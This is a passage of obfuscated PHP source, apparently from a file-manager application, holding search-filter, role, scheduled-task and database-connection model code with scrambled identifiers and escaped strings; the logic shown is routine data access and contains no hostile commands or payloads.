$ÌúÒÎÁñ); } $ÔçŸß°Ş = $this->field($ü½Ã£™¤[193])->where($ÒŞ›”’á)->select(); $Óè¨ø¿ğ = array_to_keyvalue($ÔçŸß°Ş, $ü½Ã£™¤[12], $ü½Ã£™¤[193]); return $Óè¨ø¿ğ; } private function _listSearchChildrenNear($¢³Ñ‡Ëù, $ØÏ¨ç’¿) { $±Äïœ×« =& $_SERVER[±Ö‰ô½¯]; $ÖÎÒ•üË = array(); $»Ü¥ŸËÄ = array($±Äïœ×«[192] => $¢³Ñ‡Ëù); $¡Øâ ä„ = $this->field($±Äïœ×«[2409])->where($»Ü¥ŸËÄ)->select(); $ÒšÜÑÍÏ = array_to_keyvalue(array_filter_by_field($¡Øâ ä„, $±Äïœ×«[497], $±Äïœ×«[91]), $±Äïœ×«[12], $±Äïœ×«[193]); $ÖÎÒ•üË = array_merge($ÖÎÒ•üË, array_to_keyvalue($¡Øâ ä„, $±Äïœ×«[12], $±Äïœ×«[193])); if (!$ÒšÜÑÍÏ) { return $ÖÎÒ•üË; } $»Ü¥ŸËÄ = array($±Äïœ×«[192] => array($±Äïœ×«[7], $ÒšÜÑÍÏ)); $¡Øâ ä„ = $this->field($±Äïœ×«[2409])->where($»Ü¥ŸËÄ)->limit($ØÏ¨ç’¿)->select(); $ÖÎÒ•üË = array_merge($ÖÎÒ•üË, array_to_keyvalue($¡Øâ ä„, $±Äïœ×«[12], $±Äïœ×«[193])); $ÖÎÒ•üË = array_slice($ÖÎÒ•üË, 0, intval($ØÏ¨ç’¿)); return $ÖÎÒ•üË; } private function _listSearchBindPinyin($Éºâ×â±, &$¹Ç¸³ÍØ, &$ÄÈñ•Ü) { $Ä¦ƒ÷•‡ =& $_SERVER[±Ö‰ô½¯]; if (!isset($Éºâ×â±[$Ä¦ƒ÷•‡[2232]]) || !$Éºâ×â±[$Ä¦ƒ÷•‡[2232]]) { return; } if (!Input::check($Éºâ×â±[$Ä¦ƒ÷•‡[2232]], $Ä¦ƒ÷•‡[395]) || strlen($Éºâ×â±[$Ä¦ƒ÷•‡[2232]]) < 2) { return; } $•©ÆÄ¢¹ = "\x4c\x45\x46\124\x20\112\x4f\x49\x4e\40{$this->tablePrefix}\x69\157\x5f\163\x6f\x75\x72\143\x65\x5f\155\x65\164\141\x20\155\x65\x74\x61\x20\157\156\x20\x73\157\165\162\x63\145\x2e\163\x6f\165\162\x63\145\x49\104\40\75\x20\155\145\x74\x61\x2e\163\x6f\165\162\x63\145\x49\104"; $ôŒİ¿Ÿ¡ = array(); $ÄÈñ•Ü = str_replace(array($Ä¦ƒ÷•‡[287], $Ä¦ƒ÷•‡[53], $Ä¦ƒ÷•‡[2410]), $Ä¦ƒ÷•‡[12], $ÄÈñ•Ü); $ÄÈñ•Ü = $Ä¦ƒ÷•‡[522] . str_replace($Ä¦ƒ÷•‡[50], $Ä¦ƒ÷•‡[523], $ÄÈñ•Ü); $é§ßÔºê = $¹Ç¸³ÍØ[$Ä¦ƒ÷•‡[32]]; unset($¹Ç¸³ÍØ[$Ä¦ƒ÷•‡[32]]); foreach ($¹Ç¸³ÍØ as $æÛÆĞı  => $àÎ½•š›) { $ôŒİ¿Ÿ¡[$Ä¦ƒ÷•‡[522] . $æÛÆĞı ] = $àÎ½•š›; } foreach ($é§ßÔºê as $™‡‰ ¹‡) { $ôŒİ¿Ÿ¡[] = array($Ä¦ƒ÷•‡[527] => $™‡‰ ¹‡, $Ä¦ƒ÷•‡[1116] => $Ä¦ƒ÷•‡[2236], array($Ä¦ƒ÷•‡[2411] => $™‡‰ ¹‡, $Ä¦ƒ÷•‡[2412] => array($Ä¦ƒ÷•‡[7], array($Ä¦ƒ÷•‡[549], $Ä¦ƒ÷•‡[548])))); } $this->join($•©ÆÄ¢¹); $¹Ç¸³ÍØ = $ôŒİ¿Ÿ¡; } private function _parseSearchWhere($‡«Ä¶¡‰) { $ÀºòÆÁõ =& $_SERVER[±Ö‰ô½¯]; $ÚÅ—İ‚Ô = array(); if (isset($‡«Ä¶¡‰[$ÀºòÆÁõ[858]]) && $‡«Ä¶¡‰[$ÀºòÆÁõ[858]]) { $ÚÅ—İ‚Ô[$ÀºòÆÁõ[88]] = array($ÀºòÆÁõ[2413], $‡«Ä¶¡‰[$ÀºòÆÁõ[858]]); } if (isset($‡«Ä¶¡‰[$ÀºòÆÁõ[859]]) && $‡«Ä¶¡‰[$ÀºòÆÁõ[859]]) { $É”ê®Ç¨ = array($ÀºòÆÁõ[2414], $‡«Ä¶¡‰[$ÀºòÆÁõ[859]]); if ($ÚÅ—İ‚Ô[$ÀºòÆÁõ[88]]) { $ÚÅ—İ‚Ô[$ÀºòÆÁõ[88]] = array($ÚÅ—İ‚Ô[$ÀºòÆÁõ[88]], $É”ê®Ç¨, $ÀºòÆÁõ[2415]); } else { $ÚÅ—İ‚Ô[$ÀºòÆÁõ[88]] = $É”ê®Ç¨; } } if (isset($‡«Ä¶¡‰[$ÀºòÆÁõ[2407]]) && $‡«Ä¶¡‰[$ÀºòÆÁõ[2407]] > 0) { $ÚÅ—İ‚Ô[$ÀºòÆÁõ[79]] = array($ÀºòÆÁõ[2413], $‡«Ä¶¡‰[$ÀºòÆÁõ[2407]]); } if (isset($‡«Ä¶¡‰[$ÀºòÆÁõ[2408]]) && $‡«Ä¶¡‰[$ÀºòÆÁõ[2408]]) { $É”ê®Ç¨ = array($ÀºòÆÁõ[2414], $‡«Ä¶¡‰[$ÀºòÆÁõ[2408]]); if ($ÚÅ—İ‚Ô[$ÀºòÆÁõ[79]]) { $ÚÅ—İ‚Ô[$ÀºòÆÁõ[79]] = array($ÚÅ—İ‚Ô[$ÀºòÆÁõ[79]], $É”ê®Ç¨, $ÀºòÆÁõ[2415]); } else { $ÚÅ—İ‚Ô[$ÀºòÆÁõ[79]] = $É”ê®Ç¨; } } if (isset($‡«Ä¶¡‰[$ÀºòÆÁõ[682]]) && $‡«Ä¶¡‰[$ÀºòÆÁõ[682]]) { $ÚÅ—İ‚Ô[] = array($ÀºòÆÁõ[540] => $‡«Ä¶¡‰[$ÀºòÆÁõ[682]], $ÀºòÆÁõ[538] => $‡«Ä¶¡‰[$ÀºòÆÁõ[682]], $ÀºòÆÁõ[1116] => $ÀºòÆÁõ[2236]); } if (isset($‡«Ä¶¡‰[$ÀºòÆÁõ[498]]) && $‡«Ä¶¡‰[$ÀºòÆÁõ[498]]) { $¦çˆ´« = $‡«Ä¶¡‰[$ÀºòÆÁõ[498]]; if ($¦çˆ´« == $ÀºòÆÁõ[78]) { $ÚÅ—İ‚Ô[$ÀºòÆÁõ[497]] = 1; } else { if ($¦çˆ´« == $ÀºòÆÁõ[2416]) { $ÚÅ—İ‚Ô[$ÀºòÆÁõ[497]] = 0; } else { if ($¦çˆ´«) { $¦çˆ´« = is_array($¦çˆ´«) ? $¦çˆ´« : explode($ÀºòÆÁõ[50], $¦çˆ´«); $ÚÅ—İ‚Ô[$ÀºòÆÁõ[498]] = array($ÀºòÆÁõ[504], $¦çˆ´«); $ÚÅ—İ‚Ô[$ÀºòÆÁõ[497]] = 0; } } } } $this->_parseSearchParent($‡«Ä¶¡‰, $ÚÅ—İ‚Ô); if (isset($‡«Ä¶¡‰[$ÀºòÆÁõ[2232]]) && trim($‡«Ä¶¡‰[$ÀºòÆÁõ[2232]])) { $Ñõˆ†šÀ = trim($‡«Ä¶¡‰[$ÀºòÆÁõ[2232]]); $Íè˜·§¶ = explode($ÀºòÆÁõ[53], $Ñõˆ†šÀ); if (strlen($Ñõˆ†šÀ) > 2 && (substr($Ñõˆ†šÀ, 0, 1) == $ÀºòÆÁõ[119] && substr($Ñõˆ†šÀ, -1) == $ÀºòÆÁõ[119]) || substr($Ñõˆ†šÀ, 0, 1) == $ÀºòÆÁõ[58] && substr($Ñõˆ†šÀ, -1) == $ÀºòÆÁõ[58]) { $Ñõˆ†šÀ = substr($Ñõˆ†šÀ, 1, -1); $Íè˜·§¶ = array($Ñõˆ†šÀ); } $ÚÅ—İ‚Ô[$ÀºòÆÁõ[32]] = array(array($ÀºòÆÁõ[632], $ÀºòÆÁõ[2234] . $Ñõˆ†šÀ . $ÀºòÆÁõ[2234])); if (count($Íè˜·§¶) > 1) { $ÚÅ—İ‚Ô[$ÀºòÆÁõ[32]] = array(); foreach ($Íè˜·§¶ as $¼½ŸœäÒ) { if (!trim($¼½ŸœäÒ)) { continue; } $ÚÅ—İ‚Ô[$ÀºòÆÁõ[32]][] = array($ÀºòÆÁõ[632], $ÀºòÆÁõ[2234] . trim($¼½ŸœäÒ) . $ÀºòÆÁõ[2234]); } } } return $ÚÅ—İ‚Ô; } private function _parseSearchParent($âğàóä‡, &$Œç˜‡Äã) { $²™Ó›–Û =& $_SERVER[±Ö‰ô½¯]; if (!isset($âğàóä‡[$²™Ó›–Û[192]]) || !$âğàóä‡[$²™Ó›–Û[192]]) { return; } $¶œé¹ìï = $this->pathInfo($âğàóä‡[$²™Ó›–Û[192]]); $ôÎê³ç = $¶œé¹ìï[$²™Ó›–Û[192]] . $²™Ó›–Û[12] === $²™Ó›–Û[230]; $–óÓÓ“æ = $¶œé¹ìï[$²™Ó›–Û[190]] == $²™Ó›–Û[595]; if ($¶œé¹ìï[$²™Ó›–Û[611]] == $²™Ó›–Û[612]) { $¹³¹Â¬ = $this->sourceInfo($âğàóä‡[$²™Ó›–Û[192]]); $¶œé¹ìï[$²™Ó›–Û[601]] = $¹³¹Â¬[$²™Ó›–Û[601]]; } $Œç˜‡Äã[$²™Ó›–Û[672]] = array($²™Ó›–Û[632], $¶œé¹ìï[$²™Ó›–Û[601]] . $âğàóä‡[$²™Ó›–Û[192]] . $²™Ó›–Û[633]); $œ„Ö‚¿ú = isset($âğàóä‡[$²™Ó›–Û[2098]]) && in_array($²™Ó›–Û[595], $âğàóä‡[$²™Ó›–Û[2098]]); if (!$œ„Ö‚¿ú || !$–óÓÓ“æ || !$ôÎê³ç || !$¶œé¹ìï[$²™Ó›–Û[499]]) { return; } if (!AuthModel::authCheckRoot($¶œé¹ìï[$²™Ó›–Û[499]][$²™Ó›–Û[500]])) { return; } $è¸ŒŞ¹ = $¶œé¹ìï[$²™Ó›–Û[586]] . $²™Ó›–Û[12]; if ($è¸ŒŞ¹ == $²™Ó›–Û[91]) { unset($Œç˜‡Äã[$²™Ó›–Û[672]]); $Œç˜‡Äã[$²™Ó›–Û[190]] = self::TYPE_GROUP; return; } $Üªä‡Éş = Model($²™Ó›–Û[602])->groupChildrenAll($è¸ŒŞ¹); $˜èë = count($Üªä‡Éş); if ($˜èë <= 1) { return; } $¡Õªì†ó = array($²™Ó›–Û[192] => 0, $²™Ó›–Û[190] => self::TYPE_GROUP, $²™Ó›–Û[586] => array($²™Ó›–Û[7], $Üªä‡Éş)); $‚×ù·”ä = $this->field($²™Ó›–Û[2417])->where($¡Õªì†ó)->limit($˜èë)->select(); $Œç˜‡Äã[$²™Ó›–Û[672]] = array(); foreach ($‚×ù·”ä as $Î“»òòÒ) { $Œç˜‡Äã[$²™Ó›–Û[672]][] = array($²™Ó›–Û[632], $²™Ó›–Û[610] . $Î“»òòÒ[$²™Ó›–Û[193]] . $²™Ó›–Û[633]); } $Œç˜‡Äã[$²™Ó›–Û[672]][] = $²™Ó›–Û[2236]; } } goto d¥ƒ™¯ëÇÒ; B±Ş—øÓÓ‘: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\x2e\162\x6f\x6c\x65\x4c\x69\163\164"; public $field = array("\x6e\x61\155\x65", "\141\x75\x74\150", "\154\x61\142\145\x6c", "\144\151\x73\x70\154\141\171", "\x73\x79\x73\x74\145\155", "\x64\x65\163\x63", "\x69\147\156\x6f\x72\145\x45\170\164", "\x69\x67\156\157\x72\145\x46\151\x6c\x65\x53\151\x7a\x65", "\x61\x64\155\151\156\x69\x73\164\x72\141\x74\x6f\x72", "\x73\x6f\x72\x74"); public function listData($×Å¤Èô = false, $ä¾ÛÌÊñ = "\x73\157\162\164", $é†ŞÓ = false) { $”Á×æµÕ =& $_SERVER[±Ö‰ô½¯]; $“Úãê’ë = parent::listData($×Å¤Èô, $ä¾ÛÌÊñ, $é†ŞÓ); if (!$×Å¤Èô) { foreach ($“Úãê’ë as $—†Ñ“œ¡ => $€ºö‰ÉÆ) { if ($€ºö‰ÉÆ[$”Á×æµÕ[2329]] == 1) { $“Úãê’ë[$—†Ñ“œ¡][$”Á×æµÕ[537]] = LNG($”Á×æµÕ[2619]); } } } return $“Úãê’ë; } public function update($Ğ£È‚«’, $¢Àó¢ë) { $˜ˆùòÑÃ =& $_SERVER[±Ö‰ô½¯]; $±«ƒÃÏ¨ = parent::listData($Ğ£È‚«’); $Ò ¯äµ” = $this->findByName($¢Àó¢ë[$˜ˆùòÑÃ[32]]); if (!$±«ƒÃÏ¨ || $Ò ¯äµ” && $Ò ¯äµ”[$˜ˆùòÑÃ[484]] != $±«ƒÃÏ¨[$˜ˆùòÑÃ[484]]) { return !1; } if ($Ò ¯äµ”[$˜ˆùòÑÃ[2329]] == 1) { $¢Àó¢ë = array($˜ˆùòÑÃ[32] => $¢Àó¢ë[$˜ˆùòÑÃ[32]], $˜ˆùòÑÃ[2157] => $¢Àó¢ë[$˜ˆùòÑÃ[2157]]); } $this->filterAuth($¢Àó¢ë[$˜ˆùòÑÃ[499]]); return parent::update($Ğ£È‚«’, $¢Àó¢ë); } public function remove($™Øõ¹Ò¨) { $®¹æñ­ = parent::listData($™Øõ¹Ò¨); if (!$®¹æñ­ || $®¹æñ­[$_SERVER[±Ö‰ô½¯][191]]) { return !1; } return parent::remove($™Øõ¹Ò¨); } public function add($‡‚ªìèŒ) { $ñ‰¸ö =& $_SERVER[±Ö‰ô½¯]; $Œšààì = $‡‚ªìèŒ[$ñ‰¸ö[32]]; if ($this->findByName($Œšààì)) { return !1; } $éìğ µÏ = array($ñ‰¸ö[506] => $Œšààì, $ñ‰¸ö[2142] => $ñ‰¸ö[12], $ñ‰¸ö[2138] => $ñ‰¸ö[2146], $ñ‰¸ö[2620] => 1, $ñ‰¸ö[2141] => 0, $ñ‰¸ö[2621] => 0, $ñ‰¸ö[2140] => $this->getSort()); $‡‚ªìèŒ = array_merge($éìğ µÏ, $‡‚ªìèŒ); $this->filterAuth($‡‚ªìèŒ[$ñ‰¸ö[499]]); return parent::insert($‡‚ªìèŒ); } private function getSort() { $­¸Ìå¡– =& $_SERVER[±Ö‰ô½¯]; $Ô¦¼Ì‡± = parent::listData(); $õ³É¶Êî = array_to_keyvalue($Ô¦¼Ì‡±, $­¸Ìå¡–[12], $­¸Ìå¡–[2158]); return empty($õ³É¶Êî) ? 0 : max($õ³É¶Êî) + 1; } private function filterAuth(&$»È‚®±¡) { $×ËÍ‘Ø¡ =& $_SERVER[±Ö‰ô½¯]; $ïğÌ½› = array(); $ŠÂ¤Â = array_filter(explode($×ËÍ‘Ø¡[50], $»È‚®±¡)); foreach ($ŠÂ¤Â as $»È‚®±¡) { $Ï§Ï´Ğ = explode($×ËÍ‘Ø¡[10], $»È‚®±¡); if ($Ï§Ï´Ğ[0] == $×ËÍ‘Ø¡[2622] && $Ï§Ï´Ğ[1] != $×ËÍ‘Ø¡[1255]) { $ê×‹µ´ = $Ï§Ï´Ğ[0] . $×ËÍ‘Ø¡[10] . $Ï§Ï´Ğ[1] . $×ËÍ‘Ø¡[2623]; if (!in_array($ê×‹µ´, $ŠÂ¤Â)) { $ïğÌ½›[] = $ê×‹µ´; } } $ïğÌ½›[] = $»È‚®±¡; } $»È‚®±¡ = implode($×ËÍ‘Ø¡[50], $ïğÌ½›); } public function findRoleDefault() { $ÜãñÖ¨ =& $_SERVER[±Ö‰ô½¯]; $¥–ùƒ¤¿ = parent::listData(); $Äö½çÂ = !1; foreach ($¥–ùƒ¤¿ as $ãŠó¶ˆ) { if (!$ãŠó¶ˆ || $ãŠó¶ˆ[$ÜãñÖ¨[2156]] == $ÜãñÖ¨[230] || $ãŠó¶ˆ[$ÜãñÖ¨[2329]] == 1) { continue; } if (strstr($ãŠó¶ˆ[$ÜãñÖ¨[499]], $ÜãñÖ¨[2624])) { continue; } if (!strstr($ãŠó¶ˆ[$ÜãñÖ¨[499]], $ÜãñÖ¨[2625])) { continue; } if (!$Äö½çÂ) { $Äö½çÂ = $ãŠó¶ˆ; continue; } $®Ö‘€³’ = explode($ÜãñÖ¨[50], $Äö½çÂ[$ÜãñÖ¨[499]]); $æ¬Ó‚„º = explode($ÜãñÖ¨[50], $ãŠó¶ˆ[$ÜãñÖ¨[499]]); if (count($®Ö‘€³’) > count($æ¬Ó‚„º)) { $Äö½çÂ = $ãŠó¶ˆ; } } return $Äö½çÂ ? $Äö½çÂ[$ÜãñÖ¨[484]] : $ÜãñÖ¨[12]; } public function sort($šòÁ¿™â, $³Øëõ¿) { return parent::update($šòÁ¿™â, $³Øëõ¿); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\x2e\164\141\x73\x6b\x4c\x69\163\x74"; public $field = array("\x6e\x61\x6d\145", "\164\171\160\145", "\x65\x76\145\x6e\164", "\x74\151\155\x65", "\x64\x65\163\x63", "\163\171\163\x74\145\x6d", "\x65\156\141\x62\154\145", "\x6c\141\163\164\122\x75\x6e", "\x73\x6f\162\x74"); public function listData($úï…éÇë = false, $…ôò¾ = "\163\157\x72\x74", $½íÛéì” = false) { return parent::listData($úï…éÇë, $…ôò¾, $½íÛéì”); } public function add($©¬Á±¹©) { $ğ¶õÇ·± =& $_SERVER[±Ö‰ô½¯]; $Å”ÃÙÂ = $this->findByName($©¬Á±¹©[$ğ¶õÇ·±[32]]); if ($Å”ÃÙÂ) { return !1; } $©¬Á±¹©[$ğ¶õÇ·±[1881]] = 0; $©¬Á±¹©[$ğ¶õÇ·±[2158]] = $this->getSort(); return parent::insert($©¬Á±¹©); } private function getSort() { $¶´½°Ë¼ =& $_SERVER[±Ö‰ô½¯]; $ãúØ¶Ìá = parent::listData(); $ÖËÇ„× = array_to_keyvalue($ãúØ¶Ìá, $¶´½°Ë¼[12], $¶´½°Ë¼[2158]); return empty($ÖËÇ„×) ? 0 : max($ÖËÇ„×) + 1; } public function update($æÑ’¿ƒ, $Ó¿¨À½Ò) { $õÆıÄĞ =& $_SERVER[±Ö‰ô½¯]; $›ê—Şï€ = $this->listData($æÑ’¿ƒ); $ŒóÉÔİÜ = $this->findByName($Ó¿¨À½Ò[$õÆıÄĞ[32]]); if (!$›ê—Şï€ || $ŒóÉÔİÜ && $ŒóÉÔİÜ[$õÆıÄĞ[484]] != $›ê—Şï€[$õÆıÄĞ[484]]) { return !1; } return parent::update($æÑ’¿ƒ, $Ó¿¨À½Ò); } public function remove($‘£îáŞü, $À÷ÎÕÏ¿ = false) { $¦ëšÙÍ‘ =& $_SERVER[±Ö‰ô½¯]; $Ï¹ÜÔ‘£ = $this->listData($‘£îáŞü); if (!$Ï¹ÜÔ‘£) { return; } if (!$À÷ÎÕÏ¿ && $Ï¹ÜÔ‘£[$¦ëšÙÍ‘[191]] == $¦ëšÙÍ‘[91]) { return !1; } return parent::remove($‘£îáŞü); } public function enable($Ø­ÏÇÍÖ, $ŠÅÔÅú÷) { return $this->update($Ø­ÏÇÍÖ, array($_SERVER[±Ö‰ô½¯][2614] => $ŠÅÔÅú÷)); } public function run($²•¥Ş¹¡) { return $this->update($²•¥Ş¹¡, array($_SERVER[±Ö‰ô½¯][2626] => time())); } } goto B±ŸØØÉ›Ö; aÉÕÊíÓ±Î: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\x69\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\156\x65\161" => "\x3c\x3e", "\x67\164" => "\x3e", "\x65\147\164" => "\76\75", "\154\x74" => "\x3c", "\145\x6c\x74" => "\x3c\x3d", "\156\x6f\x74\x6c\151\x6b\145" => "\x4e\117\124\40\x4c\x49\x4b\x45", "\154\x69\153\145" => "\x4c\111\x4b\x45", "\151\156" => "\111\x4e", "\x6e\x6f\164\151\156" => "\x4e\x4f\x54\40\x49\x4e", "\x6e\157\164\x20\x69\156" => "\x4e\117\124\40\111\116", "\x62\x65\x74\167\x65\x65\156" => "\x42\x45\x54\127\105\105\116", "\156\x6f\164\142\x65\164\167\x65\145\156" => "\116\117\x54\x20\102\105\124\127\x45\105\x4e", "\156\157\164\40\x62\145\164\167\x65\145\x6e" => "\x4e\117\x54\40\102\105\124\x57\105\105\116"); protected $selectSql = "\123\x45\x4c\x45\103\x54\45\104\x49\123\124\x49\x4e\103\x54\x25\40\x25\106\111\x45\x4c\104\45\40\106\x52\117\x4d\x20\x25\124\x41\x42\x4c\x45\45\x25\112\x4f\x49\116\45\x25\127\x48\x45\122\105\x25\x25\x47\122\x4f\125\120\45\x25\110\x41\126\x49\x4e\107\x25\45\x4f\122\104\x45\122\45\x25\114\111\115\x49\x54\x25\40\x25\125\116\x49\x4f\x4e\45\45\103\117\x4d\115\105\116\124\x25"; protected $bind = array(); public static function getInstance() { $«ÚåÁ’ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[±Ö‰ô½¯][1076], $«ÚåÁ’); } public function factory($ÆÔèºÛ¢ = '') { $­Íª‚è¼ =& $_SERVER[±Ö‰ô½¯]; $ÆÔèºÛ¢ = $this->parseConfig($ÆÔèºÛ¢); if (empty($ÆÔèºÛ¢[$­Íª‚è¼[1077]])) { think_exception(think_lang($­Íª‚è¼[1078])); } $this->dbType = ucwords(strtolower($ÆÔèºÛ¢[$­Íª‚è¼[1077]])); $åå¶Ô„ø = $­Íª‚è¼[1079] . $this->dbType; if (class_exists($åå¶Ô„ø)) { $¾¶‹Ì„¿ = new $åå¶Ô„ø($ÆÔèºÛ¢); if ($­Íª‚è¼[1080] != strtolower($ÆÔèºÛ¢[$­Íª‚è¼[1077]])) { $¾¶‹Ì„¿->dbType = strtoupper($this->dbType); } else { $¾¶‹Ì„¿->dbType = $this->_getDsnType($ÆÔèºÛ¢[$­Íª‚è¼[1032]]); } } else { think_exception(think_lang($­Íª‚è¼[1081]) . $­Íª‚è¼[1082] . $åå¶Ô„ø); } return $¾¶‹Ì„¿; } public function __call($¹¿³ı”‡, $¯ğÊÎ÷˜) { if (method_exists($this, $¹¿³ı”‡)) { return call_user_func_array(array($this, $¹¿³ı”‡), $¯ğÊÎ÷˜); } } protected function _getDsnType($¸´æÀ€¬) { $­‚Ó×ŸÉ = explode($_SERVER[±Ö‰ô½¯][4], $¸´æÀ€¬); $€Õàî× = strtoupper(trim($­‚Ó×ŸÉ[0])); return $€Õàî×; } private function parseConfig($ÁŠÂïÍ× = '') { $Î°É†Ò =& $_SERVER[±Ö‰ô½¯]; if (!empty($ÁŠÂïÍ×) && is_string($ÁŠÂïÍ×)) { $ÁŠÂïÍ× = $this->parseDSN($ÁŠÂïÍ×); } elseif (is_array($ÁŠÂïÍ×)) { $ÁŠÂïÍ× = array_change_key_case($ÁŠÂïÍ×); $ÁŠÂïÍ× = array($Î°É†Ò[1077] => $ÁŠÂïÍ×[$Î°É†Ò[1083]], $Î°É†Ò[1001] => $ÁŠÂïÍ×[$Î°É†Ò[1084]], $Î°É†Ò[1002] => $ÁŠÂïÍ×[$Î°É†Ò[1085]], $Î°É†Ò[999] => $ÁŠÂïÍ×[$Î°É†Ò[1086]], $Î°É†Ò[1000] => $ÁŠÂïÍ×[$Î°É†Ò[1087]], $Î°É†Ò[21] => $ÁŠÂïÍ×[$Î°É†Ò[1088]], $Î°É†Ò[1032] => $ÁŠÂïÍ×[$Î°É†Ò[1089]], $Î°É†Ò[17] => isset($ÁŠÂïÍ×[$Î°É†Ò[1090]]) ? $ÁŠÂïÍ×[$Î°É†Ò[1090]] : array()); } elseif (empty($ÁŠÂïÍ×)) { if (think_config($Î°É†Ò[1091]) && $Î°É†Ò[1080] != strtolower(think_config($Î°É†Ò[1092]))) { $ÁŠÂïÍ× = $this->parseDSN(think_config($Î°É†Ò[1091])); } else { $ÁŠÂïÍ× = array($Î°É†Ò[1077] => think_config($Î°É†Ò[1092]), $Î°É†Ò[1001] => think_config($Î°É†Ò[1093]), $Î°É†Ò[1002] => think_config($Î°É†Ò[1094]), $Î°É†Ò[999] => think_config($Î°É†Ò[1095]), $Î°É†Ò[1000] => think_config($Î°É†Ò[1096]), $Î°É†Ò[21] => think_config($Î°É†Ò[325]), $Î°É†Ò[1032] => think_config($Î°É†Ò[1091]), $Î°É†Ò[17] => think_config($Î°É†Ò[1097])); } } return $ÁŠÂïÍ×; } protected function initConnect($²£Ş»²É = true) { if (1 == think_config($_SERVER[±Ö‰ô½¯][22])) { $this->_linkID = $this->multiConnect($²£Ş»²É); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ı¦¯µØÊ => $ Ó±Å³) { $this->_linkID = $ Ó±Å³; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($£µ°§èÎ = false) { $ü¥ŸÈ¾È =& $_SERVER[±Ö‰ô½¯]; static $ÆÎ­ÊÆ = array(); static $úÙãï½ = -1; if (empty($ÆÎ­ÊÆ)) { foreach ($this->config as $çÁĞñÇ => $„ÇÊ€¦Ñ) { $ÆÎ­ÊÆ[$çÁĞñÇ] = explode($ü¥ŸÈ¾È[50], $„ÇÊ€¦Ñ); } } if (think_config($ü¥ŸÈ¾È[1098])) { if ($£µ°§èÎ || think_config($ü¥ŸÈ¾È[483]) === !0) { $ŒŠ™™¤˜ = floor(mt_rand(0, think_config($ü¥ŸÈ¾È[1099]) - 1)); $úÙãï½ = $ŒŠ™™¤˜; } else { if (is_numeric(think_config($ü¥ŸÈ¾È[1100]))) { $ŒŠ™™¤˜ = think_config($ü¥ŸÈ¾È[1100]); } else { $ŒŠ™™¤˜ = floor(mt_rand(think_config($ü¥ŸÈ¾È[1099]), count($ÆÎ­ÊÆ[$ü¥ŸÈ¾È[999]]) - 1)); } } } else { $ŒŠ™™¤˜ = floor(mt_rand(0, count($ÆÎ­ÊÆ[$ü¥ŸÈ¾È[999]]) - 1)); $úÙãï½ = $ŒŠ™™¤˜; } $ŒŠ™™¤˜ = $úÙãï½ !== -1 ? $úÙãï½ : $ŒŠ™™¤˜; $ŸŠ‘Š¼œ = array($ü¥ŸÈ¾È[1001] => isset($ÆÎ­ÊÆ[$ü¥ŸÈ¾È[1001]][$ŒŠ™™¤˜]) ? $ÆÎ­ÊÆ[$ü¥ŸÈ¾È[1001]][$ŒŠ™™¤˜] : $ÆÎ­ÊÆ[$ü¥ŸÈ¾È[1001]][0], $ü¥ŸÈ¾È[1002] => isset($ÆÎ­ÊÆ[$ü¥ŸÈ¾È[1002]][$ŒŠ™™¤˜]) ? $ÆÎ­ÊÆ[$ü¥ŸÈ¾È[1002]][$ŒŠ™™¤˜] : $ÆÎ­ÊÆ[$ü¥ŸÈ¾È[1002]][0], $ü¥ŸÈ¾È[999] => isset($ÆÎ­ÊÆ[$ü¥ŸÈ¾È[999]][$ŒŠ™™¤˜]) ? $ÆÎ­ÊÆ[$ü¥ŸÈ¾È[999]][$ŒŠ™™¤˜] : $ÆÎ­ÊÆ[$ü¥ŸÈ¾È[999]][0], $ü¥ŸÈ¾È[1000] => isset($ÆÎ­ÊÆ[$ü¥ŸÈ¾È[1000]][$ŒŠ™™¤˜]) ? $ÆÎ­ÊÆ[$ü¥ŸÈ¾È[1000]][$ŒŠ™™¤˜] : $ÆÎ­ÊÆ[$ü¥ŸÈ¾È[1000]][0], $ü¥ŸÈ¾È[21] => isset($ÆÎ­ÊÆ[$ü¥ŸÈ¾È[21]][$ŒŠ™™¤˜]) ? $ÆÎ­ÊÆ[$ü¥ŸÈ¾È[21]][$ŒŠ™™¤˜] : $ÆÎ­ÊÆ[$ü¥ŸÈ¾È[21]][0], $ü¥ŸÈ¾È[1032] => isset($ÆÎ­ÊÆ[$ü¥ŸÈ¾È[1032]][$ŒŠ™™¤˜]) ? $ÆÎ­ÊÆ[$ü¥ŸÈ¾È[1032]][$ŒŠ™™¤˜] : $ÆÎ­ÊÆ[$ü¥ŸÈ¾È[1032]][0], $ü¥ŸÈ¾È[17] => isset($ÆÎ­ÊÆ[$ü¥ŸÈ¾È[17]][$ŒŠ™™¤˜]) ? $ÆÎ­ÊÆ[$ü¥ŸÈ¾È[17]][$ŒŠ™™¤˜] : $ÆÎ­ÊÆ[$ü¥ŸÈ¾È[17]][0]); return $this->connect($ŸŠ‘Š¼œ, $ŒŠ™™¤˜); } public function parseDSN($µÁ÷ñÃï) { $å¢„•Ñ =& $_SERVER[±Ö‰ô½¯]; if (empty($µÁ÷ñÃï)) { return !1; } $·Ä¹×õÕ = parse_url($µÁ÷ñÃï); if ($·Ä¹×õÕ[$å¢„•Ñ[207]]) { $ÓŸ´ÓÛ¨ = array($å¢„•Ñ[1077] => $·Ä¹×õÕ[$å¢„•Ñ[207]], $å¢„•Ñ[1001] => isset($·Ä¹×õÕ[$å¢„•Ñ[682]]) ? $·Ä¹×õÕ[$å¢„•Ñ[682]] : $å¢„•Ñ[12], $å¢„•Ñ[1002] => isset($·Ä¹×õÕ[$å¢„•Ñ[1101]]) ? $·Ä¹×õÕ[$å¢„•Ñ[1101]] : $å¢„•Ñ[12], 